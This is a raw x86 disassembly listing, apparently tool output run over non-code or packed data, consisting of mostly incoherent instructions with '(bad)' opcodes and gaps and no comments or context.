  429129:	sar    BYTE PTR [ecx],0xfe
  42912c:	scas   al,BYTE PTR es:[edi]
  42912d:	hlt    
  42912e:	cmp    al,0x0
  429130:	stos   BYTE PTR es:[edi],al
  429131:	sub    DWORD PTR [eax-0x3a0b8b40],esi
  429137:	add    BYTE PTR [ecx],cl
  429139:	cmp    cl,bh
  42913b:	mov    al,cs:0xb262d325
  429141:	aas    
  429142:	add    ebp,DWORD PTR [edi+0x12]
  429145:	inc    ebp
  429146:	push   eax
  429147:	xchg   ecx,esp
  429149:	repz or DWORD PTR [edx-0x394e1f0f],esi
  429150:	(bad)  
  429151:	call   0x7a38ce10
  429156:	xor    eax,0xfea4c7f7
  42915b:	mov    bh,0x36
  42915d:	lock add al,0x0
  429160:	(bad)  
  429161:	aam    0xfd
  429163:	ds (bad) 
  429165:	ds cmp al,0x4a
  429168:	xchg   DWORD PTR [eax+ecx*2+0x58de9afe],edi
  42916f:	push   edi
  429170:	fidiv  WORD PTR [eax]
  429172:	cmp    dh,bh
  429174:	mov    ecx,0xed8961de
  429179:	push   ecx
  42917a:	lds    ebp,FWORD PTR [edi]
  42917c:	and    BYTE PTR ds:0xf7aaccb0,dl
  429182:	aaa    
  429183:	mov    eax,0xa1
	...
  42919c:	add    BYTE PTR [eax],al
  42919e:	ret    
  42919f:	inc    esp
  4291a0:	add    BYTE PTR [edi],dh
  4291a2:	in     eax,dx
  4291a3:	pop    es
  4291a4:	xchg   ebx,ebx
  4291a6:	mov    dh,0xe9
  4291a8:	sbb    bl,BYTE PTR [edx]
  4291aa:	push   es
  4291ab:	pop    edi
  4291ac:	repnz add BYTE PTR [eax+0x5e6c047b],ch
  4291b3:	adc    eax,DWORD PTR [edx-0x447aa690]
  4291b9:	add    al,0xc
  4291bb:	shr    BYTE PTR [edi-0x2a],0xe
  4291bf:	add    DWORD PTR [ecx+eiz*8-0x5c],edi
  4291c3:	out    dx,al
  4291c4:	scas   eax,DWORD PTR es:[edi]
  4291c5:	int3   
  4291c6:	fiadd  WORD PTR [eax]
  4291c8:	pop    edx
  4291c9:	ret    
  4291ca:	lods   al,BYTE PTR ds:[esi]
  4291cb:	inc    edi
  4291cc:	mov    DWORD PTR [ebx+0xd],0x1d026bbf
  4291d3:	add    al,0xd
  4291d5:	mov    ebp,cs
  4291d7:	add    eax,DWORD PTR [eax]
  4291d9:	add    bl,ch
  4291db:	test   eax,0x153d230
  4291e0:	cld    
  4291e1:	call   edx
  4291e3:	jl     0x4291ae
  4291e5:	mov    ebx,ecx
  4291e7:	outs   dx,BYTE PTR ds:[esi]
  4291e8:	mov    bh,0xcc
  4291ea:	mov    es,WORD PTR [ebx]
  4291ec:	xor    DWORD PTR [eax+eiz*2],eax
  4291ef:	dec    esp
  4291f0:	mov    DWORD PTR [ebx-0x23],0xd933c5e4
  4291f7:	outs   dx,BYTE PTR ds:[esi]
  4291f8:	mov    bl,0xcc
  4291fa:	mov    es,WORD PTR [ebx]
  4291fc:	mov    eax,edi
  4291fe:	cld    
  4291ff:	sbb    eax,DWORD PTR [eax+0xe7]
	...
  429219:	add    BYTE PTR [eax],al
  42921b:	pushf  
  42921c:	aam    0xff
  42921e:	mov    esp,0x4038dd
  429223:	mov    esi,0xffec86f7
  429228:	(bad)  
  429229:	sti    
  42922a:	inc    ecx
  42922b:	add    al,0xf8
  42922d:	xchg   BYTE PTR [eax-0x7f043b2f],bh
  429233:	xchg   DWORD PTR [edi],edx
  429235:	sti    
  429236:	dec    DWORD PTR [ebp+0x5781ba77]
  42923c:	jae    0x429238
  42923e:	push   esp
  429240:	in     eax,dx
  429241:	sub    BYTE PTR [edi],0x71
  429244:	fstp   DWORD PTR [eax+0x42a28b8]
  42924a:	xchg   ebp,esi
  42924c:	cli    
  42924d:	inc    esp
  42924e:	add    al,0x17
  429250:	test   al,0x33
  429252:	add    DWORD PTR [edi-0x4b],ebp
  429255:	and    ebx,0xfffffff5
  429258:	jb     0x42929a
  42925a:	mov    ebp,0x439e34
  42925f:	out    0x54,eax
  429261:	js     0x42925f
  429263:	and    eax,DWORD PTR [esi-0x7a18172b]
  429269:	lea    edi,[ecx]
  42926b:	ja     0x429219
  42926d:	or     BYTE PTR [ecx+0x3fd9f90d],al
  429273:	hlt    
  429274:	jmp    0xda2c1a4c
  429279:	fnstcw WORD PTR [edi]
  42927b:	hlt    
  42927c:	mov    WORD PTR [esp+ecx*8+0x0],?
	...
  429297:	add    BYTE PTR [edi],dh
  429299:	in     al,dx
  42929a:	xor    al,cl
  42929c:	pop    ss
  42929d:	push   ds
  42929e:	xor    eax,ecx
  4292a0:	outs   dx,DWORD PTR ds:[esi]
  4292a1:	xor    al,0xd5
  4292a3:	call   0x2f47e01f
  4292a8:	lock pusha 
  4292aa:	(bad)
  4292ae:	pop    esi
  4292af:	das    
  4292b0:	icebp  
  4292b1:	adc    edx,edx
  4292b3:	aas    
  4292b4:	hlt    
  4292b5:	mov    ch,0xa2
  4292b7:	je     0x42927b
  4292b9:	stos   DWORD PTR es:[edi],eax
  4292ba:	jmp    FWORD PTR [esi]
  4292bc:	mov    ah,0x63
  4292be:	adc    BYTE PTR [ebp+0x43305c],al
  4292c4:	xor    al,0x4b
  4292c6:	mov    eax,0x8aec37cc
  4292cb:	shl    DWORD PTR [ebp-0x53d0f4fc],0x5
  4292d2:	outs   dx,BYTE PTR ds:[esi]
  4292d3:	les    ebx,FWORD PTR [ecx]
  4292d5:	test   al,0x41
  4292d7:	outs   dx,DWORD PTR ds:[esi]
  4292d9:	(bad)  
  4292da:	leave  
  4292db:	or     dl,BYTE PTR [ebx]
  4292dd:	int    0x5e
  4292df:	les    edx,FWORD PTR [ecx]
  4292e1:	mov    DWORD PTR [edx-0x363baffe],esp
  4292e7:	adc    bl,BYTE PTR [ebx]
  4292e9:	int    0x5e
  4292eb:	les    esi,FWORD PTR ds:0x3536d7ed
  4292f1:	ret    0x8f3c
  4292f4:	and    BYTE PTR [eax+edi*1+0x6c],dl
  4292f8:	lods   al,BYTE PTR ds:[esi]
  4292f9:	into   
  4292fa:	es add al,0x0
	...
  429315:	pop    ds
  429316:	adc    cl,cl
  429318:	adc    eax,0x487404b4
  42931d:	or     al,0x55
  42931f:	jp     0x429339
  429321:	lods   al,BYTE PTR ds:[esi]
  429322:	adc    ebp,DWORD PTR [ecx]
  429324:	add    al,0x79
  429326:	(bad)
  429329:	dec    DWORD PTR [edi]
  42932b:	add    DWORD PTR [edi],edx
  42932d:	xor    al,0x5
  42932f:	dec    esi
  429330:	push   es
  429331:	jae    0x429372
  429333:	push   ecx
  429334:	jmp    0x4292c3
  429336:	test   BYTE PTR [edx+0x2],0xa5
  42933a:	add    esi,DWORD PTR [eax]
  42933c:	(bad)  
  42933d:	pop    esp
  42933e:	jge    0x429353
  429340:	inc    esi
  429341:	hlt    
  429342:	cmc    
  429343:	fcom   QWORD PTR [edi]
  429345:	repnz inc esp
  429347:	jmp    0x617a0812
  42934c:	loopne 0x429341
  42934e:	add    al,0xe9
  429350:	push   esi
  429351:	jae    0x42936a
  429353:	cmc    
  429354:	adc    eax,0x5ab30534
  429359:	jae    0x429392
  42935b:	loope  0x429372
  42935d:	xor    al,0x5
  42935f:	je     0x429392
  429361:	dec    esi
  429362:	or     al,0x0
  429364:	pop    ss
  429365:	cmp    al,BYTE PTR ds:0x849dee52
  42936b:	cmp    eax,0x3553a1
  429370:	jmp    0x7e2aa257
  429375:	cmc    
  429376:	clc    
  429377:	sti    
  429378:	add    BYTE PTR gs:[eax],al
	...
  42938f:	add    BYTE PTR [eax],al
  429391:	add    BYTE PTR [eax],dh
  429393:	jo     0x4293a6
  429395:	scas   al,BYTE PTR es:[edi]
  429396:	sti    
  429397:	mov    eax,0xdef02add
  42939c:	or     BYTE PTR [ebx],ch
  42939e:	clc    
  42939f:	ret    0x7105
  4293a2:	sbb    esi,DWORD PTR ds:0xf9cde800
  4293a8:	iret   
  4293a9:	pop    edi
  4293aa:	test   al,0xd2
  4293ac:	aas    
  4293ad:	jmp    0x82168d6f
  4293b2:	cdq    
  4293b3:	cli    
  4293b4:	sti    
  4293b5:	xchg   BYTE PTR [esi+0x217ef87d],ch
  4293bb:	jge    0x429380
  4293bd:	push   ss
  4293be:	xchg   esi,eax
  4293bf:	dec    ebp
  4293c0:	mov    edi,0x420b3b2
  4293c5:	fist   WORD PTR ds:0xfc05442c
  4293cb:	push   esi
  4293cc:	inc    eax
  4293cd:	(bad)  
  4293ce:	call   0xb05c984d
  4293d3:	in     al,dx
  4293d4:	or     edx,DWORD PTR [ecx+0x7f]
  4293d7:	lock sti 
  4293d9:	ds add ebx,eax
  4293dc:	repz aas 
  4293de:	jno    0x429393
  4293e0:	jmp    DWORD PTR [ebx+edx*1-0x3d4a603]
  4293e7:	add    al,0x52
  4293e9:	fisubr DWORD PTR [ebp-0xc328bd2]
  4293ef:	jbe    0x429411
  4293f1:	mov    dh,0x4
  4293f3:	mov    bh,0x7c
	...
  42940d:	add    BYTE PTR [eax],al
  42940f:	rcr    DWORD PTR [edi+ecx*2],0xb8
  429413:	mov    cl,BYTE PTR [eax]
  429415:	add    BYTE PTR [eax],al
  429417:	cmc    
  429418:	(bad)
  42941b:	mov    al,BYTE PTR [ecx-0x7f96dbb4]
  429421:	add    al,0xe
  429423:	adc    esi,DWORD PTR [edx]
  429425:	je     0x42944b
  429427:	pop    ebp
  429428:	jp     0x429409
  42942a:	pop    edi
  42942b:	or     ecx,ebx
  42942d:	or     al,0x0
  42942f:	lock sub esp,0x4e1c3983
  429436:	inc    DWORD PTR [eax]
  429438:	sbb    eax,ebp
  42943a:	popf   
  42943b:	mov    al,BYTE PTR ds:0x7f8d8bfc
  429441:	jne    0x42943b
  429443:	test   DWORD PTR [ebx],edi
  429445:	idiv   edi
  429447:	mov    bl,BYTE PTR [edi+0x80d0100]
  42944d:	je     0x42945f
  42944f:	bound  ecx,QWORD PTR [ebx-0x14]
  429452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429453:	test   BYTE PTR [edi+0x0],al
  429456:	(bad)  
  429457:	sar    al,1
  429459:	mov    eax,0xe308cd89
  42945e:	push   cs
  42945f:	and    cl,BYTE PTR [ebx-0x14]
  429462:	mov    eax,0xc7004864
  429467:	nop
  429468:	mul    DWORD PTR [ecx+ecx*4+0x334b078d]
  42946f:	push   ss
  429470:	jg     0x4294cf
  429472:	cld    
	...
  42948b:	add    BYTE PTR [ebx+edx*2+0x10],al
  42948f:	cmp    edi,esi
  429491:	adc    al,0x7e
  429493:	sbb    ecx,esp
  429495:	pop    es
  429496:	add    BYTE PTR [ebx-0x1f8500a0],cl
  42949c:	lods   eax,DWORD PTR ds:[esi]
  42949d:	jle    0x4294e4
  42949f:	hlt    
  4294a0:	hlt    
  4294a1:	mov    dl,0x84
  4294a3:	jge    0x4294a9
  4294a5:	loopne 0x429519
  4294a7:	sub    bl,BYTE PTR [edi+edx*1+0x548bfc01]
  4294ae:	inc    DWORD PTR [eax]
  4294b0:	hlt    
  4294b1:	fnsave [ebx+0x10]
  4294b4:	mov    bl,0xa8
  4294b6:	jmp    0x42945c
  4294b8:	jge    0x4294d7
  4294ba:	add    al,0xc3
  4294bc:	mov    cl,0xcd
  4294be:	mov    esp,0xe6ddb489
  4294c3:	or     dh,BYTE PTR [ebx]
  4294c5:	sub    al,dh
  4294c7:	mov    eax,0xc3041d7d
  4294cc:	mov    cl,0xad
  4294ce:	test   al,0x89
  4294d0:	mov    ah,0xdd
  4294d2:	jle    0x429539
  4294d4:	in     al,0xdd
  4294d6:	jle    0x429555
  4294d8:	sub    ch,bl
  4294da:	jae    0x429506
  4294dc:	jg     0x42947c
  4294de:	daa    
  4294df:	inc    ebp
  4294e0:	and    BYTE PTR [esi-0x4],bl
  4294e3:	add    DWORD PTR [edx+0x12ace7c9],esp
  4294e9:	mov    bh,bl
  4294eb:	xchg   DWORD PTR [eax*2+0x105],edi
	...
  429506:	add    BYTE PTR [eax],al
  429508:	add    ah,dh
  42950a:	fstp   QWORD PTR [esi]
  42950c:	enter  0xa5bf,0x79
  429510:	push   cs
  429511:	jg     0x4294cc
  429513:	or     esp,DWORD PTR [esi+0x14]
  429516:	les    esp,FWORD PTR [ebp-0x77]
  429519:	clc    
  42951a:	mov    ah,0x8c
  42951c:	pop    ebp
  42951d:	fadd   DWORD PTR [ebp-0x60]
  429520:	add    ah,dh
  429522:	fcomi  st,st(5)
  429524:	inc    ebp
  429525:	cld    
  429526:	sti    
  429527:	ja     0x429558
  429529:	jns    0x429542
  42952b:	jns    0x42952f
  42952d:	ret    0x7a9
  429530:	sub    BYTE PTR [eax],0x5
  429533:	shr    bl,1
  429535:	sub    al,0xf3
  429537:	sbb    bh,bh
  429539:	sbb    cl,BYTE PTR [eax]
  42953b:	(bad)  
  42953c:	sar    DWORD PTR ds:0xc28918fa,1
  429542:	js     0x429524
  429544:	push   ecx
  429545:	adc    bh,ah
  429547:	mov    al,ds:0xf2f342eb
  42954c:	(bad)  
  42954d:	jae    0x42958f
  42954f:	fisttp QWORD PTR [esi]
  429551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429552:	lds    ecx,FWORD PTR [ebx-0x7d]
  429555:	xor    al,0x35
  429557:	inc    ebx
  429558:	(bad)  
  429559:	clc    
  42955a:	dec    ebx
  42955b:	mov    esi,0xf9487362
  429560:	mov    cl,al
  429562:	xchg   ebp,edx
  429564:	mov    dh,BYTE PTR [ecx-0x63c09400]
  42956a:	xor    eax,0x84a9
	...
  429583:	add    BYTE PTR [eax],al
  429585:	add    BYTE PTR [esi],bh
  429587:	test   eax,0x1f44360
  42958c:	jl     0x429551
  42958e:	xchg   edx,eax
  42958f:	add    al,0x31
  429591:	adc    DWORD PTR [ebx+eax*1],0x66
  429595:	ret    
  429596:	icebp  
  429597:	fcomp  QWORD PTR [ebp-0x3]
  42959a:	pslld  mm7,QWORD PTR [ebx+0x48]
  42959e:	cld    
  42959f:	add    eax,DWORD PTR [ebx]
  4295a1:	(bad)  
  4295a3:	or     DWORD PTR [ecx-0xbf5929b],edi
  4295a9:	daa    
  4295aa:	out    0x47,al
  4295ac:	icebp  
  4295ad:	add    DWORD PTR [eax+0x2],esp
  4295b0:	fisubr DWORD PTR fs:[eax-0x2]
  4295b4:	pop    ebp
  4295b5:	dec    eax
  4295b6:	call   0x2cc1fc25
  4295bb:	repz or DWORD PTR [eax-0x1],edi
  4295bf:	cli    
  4295c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4295c1:	or     ebp,esp
  4295c3:	js     0x4295c5
  4295c5:	fmul   st,st(7)
  4295c7:	add    al,0xfa
  4295c9:	cs mov dl,0x9c
  4295cc:	add    DWORD PTR [ebp+0x1ee0acff],ebx
  4295d2:	test   DWORD PTR [edx+eiz*2],0x7589f2e8
  4295d9:	adc    DWORD PTR [esi],esi
  4295db:	out    dx,al
  4295dc:	inc    ebp
  4295dd:	fxch   st(6)
  4295df:	into   
  4295e0:	or     ebp,DWORD PTR [ebx-0x79]
  4295e3:	out    dx,al
  4295e4:	sti    
  4295e5:	neg    BYTE PTR [ecx]
  4295e7:	test   DWORD PTR [ebp-0x1f],0x0
	...
  429602:	add    BYTE PTR [edi],al
  429604:	pop    edx
  429605:	je     0x429607
  429607:	jae    0x4295ff
  429609:	je     0x4295ff
  42960b:	ins    BYTE PTR es:[edi],dx
  42960c:	inc    edi
  42960d:	or     al,0x64
  42960f:	les    esi,FWORD PTR [edx+edi*8+0x47]
  429613:	jne    0x429640
  429615:	and    BYTE PTR [edi*8-0x4e14168f],bh
  42961c:	ja     0x429612
  42961e:	ret    0x89f5
  429621:	inc    ebp
  429622:	fucom  st(4)
  429624:	mov    ebx,0x6f82cf2
  429629:	bound  esi,QWORD PTR [eax+0x4]
  42962c:	jne    0x4296a2
  42962e:	cli    
  42962f:	call   0xfac9ee9
  429634:	arpl   WORD PTR [esi-0xe],bp
  429637:	je     0x429624
  429639:	jbe    0x429631
  42963b:	stc    
  42963c:	jno    0x4295ff
  42963e:	mov    DWORD PTR [edx-0x459df785],edx
  429644:	dec    ebx
  429645:	leave  
  429646:	sub    eax,DWORD PTR [eax*1+0x56e47255]
  42964d:	push   ecx
  42964e:	mov    esi,0xcc8cfe4d
  429653:	iret   
  429654:	dec    ebp
  429655:	call   0xf831145a
  42965a:	inc    DWORD PTR [esi+0x40]
  42965d:	or     BYTE PTR [ebx+0x17e8590a],cl
  429663:	das    
  429664:	or     DWORD PTR [eax],eax
  429666:	test   DWORD PTR [eax],eax
	...
  429680:	fnsave [edi-0x1]
  429683:	mov    bh,0x2
  429685:	repnz add BYTE PTR [eax],al
  429688:	mul    BYTE PTR ds:0x70300a62
  42968e:	clc    
  42968f:	pop    eax
  429690:	in     eax,0x82
  429692:	repz inc DWORD PTR [edx+0x16084d7d]
  429699:	retf   0xe850
  42969c:	imul   esi,DWORD PTR [ebx-0x3c280000],0x75
  4296a3:	pop    es
  4296a4:	xchg   ebp,eax
  4296a5:	repnz test DWORD PTR [eax],0x32fadd4d
  4296ac:	popf   
  4296ad:	push   ecx
  4296ae:	leave  
  4296af:	ret    0x459
  4296b2:	push   ebp
  4296b3:	mov    esi,DWORD PTR [ecx]
  4296b5:	pop    esi
  4296b6:	xor    ch,BYTE PTR [edx+0x4d]
  4296b9:	push   ebp
  4296ba:	not    DWORD PTR ds:0x40170d
  4296c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4296c1:	push   esi
  4296c2:	or     al,0x83
  4296c4:	pop    ecx
  4296c5:	add    BYTE PTR [edx+0x32],ah
  4296c8:	nop
  4296c9:	cmp    al,0x4
  4296cb:	push   ecx
  4296cc:	jne    0x42965a
  4296ce:	cmp    al,0x0
  4296d0:	sbb    eax,0x1f78c087
  4296d5:	xchg   edx,ecx
  4296d7:	jne    0x4296e1
  4296d9:	scas   al,BYTE PTR es:[edi]
  4296da:	daa    
  4296db:	jbe    0x4296fa
  4296dd:	or     DWORD PTR [ebp-0x17ac1ebb],ecx
  4296e3:	mov    ds:0x0,al
	...
  4296fc:	add    BYTE PTR [ecx],al
  4296fe:	or     DWORD PTR [eax],eax
  429700:	test   esp,esi
  429702:	dec    edi
  429703:	jae    0x429714
  429705:	je     0x429706
  429707:	and    eax,0x7d5dfa75
  42970c:	add    esp,esi
  42970e:	mov    eax,0xbfb42f07
  429713:	xchg   BYTE PTR [edi],bh
  429715:	jmp    0x82d0:0x378d3942
  42971c:	repnz sub al,al
  42971f:	mov    DWORD PTR [edx],ecx
  429721:	jo     0x429747
  429723:	jae    0x42974d
  429725:	je     0x42973b
  429727:	das    
  429728:	jne    0x42970c
  42972a:	jae    0x429779
  42972c:	add    DWORD PTR [esp+eax*1+0x77],esi
  429730:	je     0x429723
  429732:	pop    ebp
  429733:	neg    BYTE PTR [eax-0x17]
  429736:	in     al,0x88
  429738:	retf   0x715c
  42973b:	or     al,0x0
  42973d:	hlt    
  42973e:	rcl    BYTE PTR [edx],cl
  429740:	push   ebx
  429741:	outs   dx,DWORD PTR ds:[esi]
  429742:	aad    0x8b
  429744:	rcr    BYTE PTR [esi+ebx*8+0xc],cl
  429748:	add    ah,dh
  42974a:	es jmp 0x429752
  42974d:	pop    es
  42974e:	mov    ch,0x5e
  429750:	mov    esp,ebp
  429752:	bound  eax,QWORD PTR [ecx+0x8]
  429755:	jns    0x4296f4
  429757:	jo     0x429764
  429759:	je     0x429740
  42975b:	sub    eax,0x7c5dee75
  429760:	add    DWORD PTR [eax],eax
	...
  42977a:	hlt    
  42977b:	adc    BYTE PTR [eax],al
  42977d:	das    
  42977e:	xor    al,0x82
  429780:	dec    BYTE PTR [edi+0x1c]
  429783:	div    dh
  429785:	sti    
  429786:	add    eax,DWORD PTR [edi]
  429788:	lea    edi,[edi]
  42978a:	mov    esp,0xf408c218
  42978f:	sbb    BYTE PTR [ebx+0x4d0577ec],cl
  429795:	cld    
  429796:	jne    0x429779
  429798:	gs add ah,dh
  42979b:	add    al,0xb6
  42979d:	mov    ?,WORD PTR [ecx]
  42979f:	std    
  4297a0:	pop    ebp
  4297a1:	pop    es
  4297a2:	push   DWORD PTR [ebp-0x7dd9b84f]
  4297a8:	sub    edi,ebx
  4297aa:	sub    dh,0x32
  4297ad:	add    al,0xf4
  4297af:	push   ebp
  4297b0:	pusha  
  4297b1:	jo     0x429783
  4297b3:	sbb    BYTE PTR [eax+0x70],dh
  4297b6:	fcom   DWORD PTR [ebx+eax*4]
  4297b9:	ds mov dl,0x79
  4297bc:	lods   al,BYTE PTR ds:[esi]
  4297bd:	dec    ebp
  4297be:	push   ss
  4297bf:	sub    bl,BYTE PTR [edi]
  4297c1:	jo     0x429792
  4297c3:	pop    edx
  4297c4:	out    0x5c,eax
  4297c6:	push   ss
  4297c7:	jl     0x429776
  4297c9:	pop    ds
  4297ca:	fdiv   st(5),st
  4297cc:	cmp    cl,BYTE PTR [ecx+eax*8+0x66]
  4297d0:	pop    esi
  4297d1:	inc    esp
  4297d2:	mov    eax,0xece3a866
  4297d7:	data16 out dx,al
  4297d9:	retf   
  4297da:	imul   esi,DWORD PTR [ecx+0xd],0x1c
	...
  4297f5:	add    BYTE PTR [eax],al
  4297f7:	(bad)  
  4297f8:	jnp    0x429817
  4297fa:	and    dl,ah
  4297fc:	lds    ebp,FWORD PTR ds:0xe96de020
  429802:	add    esi,ebp
  429804:	fsub   QWORD PTR [eax+0x60ee2f01]
  42980a:	aas    
  42980b:	rcr    BYTE PTR [eax],1
  42980d:	faddp  st(1),st
  42980f:	out    dx,eax
  429810:	mov    BYTE PTR [esi],ah
  429812:	push   es
  429813:	hlt    
  429814:	add    al,0x39
  429816:	in     al,dx
  429817:	shl    BYTE PTR [ecx],0xe9
  42981a:	add    esi,DWORD PTR [ebx+0x2]
  42981d:	je     0x42986a
  42981f:	fsub   QWORD PTR [esi+0x6e]
  429822:	inc    ebx
  429823:	mov    dl,0x53
  429825:	add    BYTE PTR [ecx+0x6efb02e0],al
  42982b:	js     0x429875
  42982d:	and    al,0xf9
  42982f:	and    al,bl
  429831:	or     esp,DWORD PTR [ebp+0x11]
  429834:	out    dx,eax
  429835:	sti    
  429836:	jmp    0xa6a7562
  42983b:	lock add al,0xfb
  42983e:	mov    ebp,0x49e814e3
  429843:	adc    DWORD PTR ds:0xf2fa6200,eax
  429849:	add    al,ch
  42984b:	sbb    ecx,DWORD PTR [eax]
  42984d:	jg     0x429878
  42984f:	mov    ds:0xb7d9fee6,eax
  429854:	jg     0x42989d
  429856:	in     eax,dx
  429857:	sub    BYTE PTR [ebp-0x5],dl
  42985a:	xchg   ebp,eax
	...
  429873:	add    bl,ch
  429875:	or     al,0xb0
  429877:	jmp    0x16f7:0x115a0911
  42987e:	sti    
  42987f:	div    dl
  429881:	les    ecx,FWORD PTR [ebx]
  429883:	gs pop ecx
  429885:	add    eax,DWORD PTR [eax]
  429887:	jmp    0x964d85fc
  42988c:	mov    al,0x40
  42988e:	sub    eax,0x44dd7
  429893:	push   ebp
  429894:	test   al,0x3c
  429896:	je     0x429873
  429898:	cmp    al,0x78
  42989a:	and    al,0xd5
  42989c:	push   0x1fdd2450
  4298a1:	mov    es,WORD PTR [ebx]
  4298a3:	scas   al,BYTE PTR es:[edi]
  4298a4:	sub    eax,0xf7e8c5db
  4298a9:	add    al,0x87
  4298ab:	adc    eax,0xe96614d4
  4298b0:	mov    eax,ds:0xd4258d03
  4298b5:	adc    DWORD PTR [eax+0x0],edx
  4298b8:	xchg   dl,ch
  4298ba:	call   0xf82ea911
  4298bf:	test   BYTE PTR [ebp-0x267fe38b],bl
  4298c5:	or     al,0x7
  4298c7:	add    eax,0xe84e00c0
  4298cc:	mov    ebx,0x36fff7a0
  4298d1:	add    al,0x80
  4298d3:	jl     0x4298c6
  4298d5:	std    
  4298d6:	add    esi,DWORD PTR [ebp+0x0]
	...
  4298f1:	rcl    DWORD PTR [esi-0x18],cl
  4298f4:	retf   
  4298f5:	cmp    al,0xee
  4298f7:	imul   eax
  4298f9:	xchg   esi,eax
  4298fa:	push   esi
  4298fc:	call   FWORD PTR [esi]
  4298fe:	cmp    eax,0xdfda1024
  429903:	test   DWORD PTR [ecx],eax
  429905:	lea    ecx,[eax]
  429907:	bound  eax,QWORD PTR [ecx]
  429909:	jmp    0x5008:0x5d1267fb
  429910:	jmp    DWORD PTR [eax-0x72bff598]
  429916:	pop    edx
  429917:	add    BYTE PTR [ebp+0x9424e1],cl
  42991d:	pop    ebp
  42991e:	or     BYTE PTR [eax+0x68],dl
  429921:	call   0x456bc864
  429926:	(bad)  
  429927:	fild   DWORD PTR [eax]
  429929:	pop    ebp
  42992a:	add    DWORD PTR [esp+0x7cd],0xffffffdd
  429932:	fsub   DWORD PTR [eax-0x7b1285aa]
  429938:	rcr    BYTE PTR [edx],0x6c
  42993b:	dec    ebp
  42993c:	add    DWORD PTR ds:0xa8016208,ebx
  429942:	xchg   ebx,eax
  429943:	and    al,0xfc
  429945:	or     eax,0xf4e80008
  42994a:	add    BYTE PTR [eax+eax*1+0xbbf61f4],bh
  429951:	js     0x42990f
  429953:	(bad)  
  429954:	inc    DWORD PTR [eax]
	...
  42996e:	hlt    
  42996f:	push   0xa
  429971:	and    al,0x9
  429973:	push   ds
  429974:	add    al,0x85
  429976:	mov    ah,0xca
  429978:	mov    al,BYTE PTR [eax+ebx*1-0xd]
  42997c:	xor    al,0xd7
  42997e:	sbb    al,0xaa
  429980:	sbb    ecx,DWORD PTR [ebx]
  429982:	add    ebx,DWORD PTR [ecx-0x6a]
  429985:	add    ah,dh
  429987:	(bad)  [ebp+0x74]
  42998a:	jno    0x429935
  42998c:	sbb    ebp,DWORD PTR [esp+ebx*1]
  42998f:	push   esi
  429990:	dec    ebx
  429991:	stc    
  429992:	mov    bl,0x32
  429994:	add    BYTE PTR [eax+edx*8-0xbfffa9b],0xad
  42999c:	ins    DWORD PTR es:[edi],dx
  42999d:	add    al,0x8c
  42999f:	jae    0x429955
  4299a1:	sti    
  4299a2:	xchg   ebx,eax
  4299a3:	pop    ecx
  4299a4:	mov    edi,0xc1670e74
  4299a9:	push   eax
  4299aa:	jno    0x429a05
  4299ac:	sbb    ecx,DWORD PTR [esi+esi*8-0x3bb00023]
  4299b3:	add    eax,0xda6bb49a
  4299b8:	jge    0x42997a
  4299ba:	call   0xba86fff7
  4299bf:	xor    ecx,DWORD PTR [ecx+0x4f221844]
  4299c5:	push   eax
  4299c6:	dec    ebx
  4299c7:	lock dec edi
  4299c9:	adc    dh,BYTE PTR [ebp+ebx*8+0x58e8c47e]
  4299d0:	and    BYTE PTR [eax+eax*1],0x0
	...
  4299e8:	add    BYTE PTR [eax],al
  4299ea:	add    BYTE PTR [ebp+ebx*8+0x217dffff],al
  4299f1:	and    BYTE PTR [eax+0x71],dl
  4299f4:	add    al,0x2d
  4299f6:	and    ah,bh
  4299f8:	push   esp
  4299f9:	ins    BYTE PTR es:[edi],dx
  4299fa:	inc    eax
  4299fb:	fdivr  DWORD PTR [eax]
  4299fd:	cmp    DWORD PTR [ebx-0x45],edx
  429a00:	jns    0x429a67
  429a02:	and    BYTE PTR [esi+eax*1-0x17],bl
  429a06:	add    esp,DWORD PTR [ebp+edi*2-0x22afe00b]
  429a0d:	jecxz  0x429a18
  429a0f:	hlt    
  429a10:	add    al,0x64
  429a12:	les    ebp,FWORD PTR [eax+0x23]
  429a15:	ror    DWORD PTR [ebx-0x916fb15],1
  429a1b:	dec    eax
  429a1c:	and    ebp,esi
  429a1e:	mul    cl
  429a20:	or     dh,dh
  429a22:	inc    ebx
  429a23:	hlt    
  429a24:	jmp    0x7e1ab9e6
  429a29:	hlt    
  429a2a:	inc    DWORD PTR [edx]
  429a2c:	inc    ebp
  429a2d:	jmp    0xb62d6128
  429a32:	pop    ds
  429a33:	cld    
  429a34:	jmp    0x21735874
  429a39:	jmp    0x8b6b:0xb6564304
  429a40:	cli    
  429a41:	call   0x75531949
  429a46:	adc    BYTE PTR [eax*1-0x5e78797],dh
  429a4d:	out    0x70,eax
	...
  429a67:	add    bh,cl
  429a69:	jmp    0x6febaa3
  429a6e:	jmp    0x5c40376
  429a73:	clc    
  429a74:	hlt    
  429a75:	add    al,0xe9
  429a77:	test   BYTE PTR [eax-0xbfc32df],0x4
  429a7e:	jo     0x429abf
  429a80:	adc    BYTE PTR ds:0x34d83f6c,dh
  429a86:	add    BYTE PTR [ecx],bl
  429a88:	and    esi,DWORD PTR [ecx+0x24]
  429a8b:	int    0x62
  429a8d:	inc    ecx
  429a8e:	and    al,0xe5
  429a90:	xchg   edx,eax
  429a91:	sar    DWORD PTR [esi],0xe9
  429a94:	push   edx
  429a95:	inc    ecx
  429a96:	and    al,0x29
  429a98:	pop    eax
  429a99:	sub    BYTE PTR [esi],bh
  429a9b:	jmp    0x2d66dbe2
  429aa0:	cmp    bl,al
  429aa2:	ds jmp 0x2166db5a
  429aa8:	int3   
  429aa9:	ret    0xe93e
  429aac:	mov    ds:0x16b52440,al
  429ab1:	ret    0xe93e
  429ab4:	xchg   edx,eax
  429ab5:	inc    eax
  429ab6:	and    al,0xb9
  429ab8:	das    
  429ab9:	ret    0xe93e
  429abc:	add    BYTE PTR [eax+0x24],0x9d
  429ac0:	push   edx
  429ac1:	ret    0xe93e
  429ac4:	lahf   
  429ac5:	xchg   ebx,eax
  429ac6:	imul   esi,DWORD PTR [esi],0xffffffa2
  429ac9:	bound  eax,QWORD PTR [ecx]
  429acb:	pop    esp
	...
  429ae4:	add    BYTE PTR [ebx],ah
  429ae6:	and    esp,edi
  429ae8:	jmp    0x512a9fe4
  429aed:	push   eax
  429aee:	add    al,0x0
  429af0:	bound  ebp,QWORD PTR [edi*8+0x14e39586]
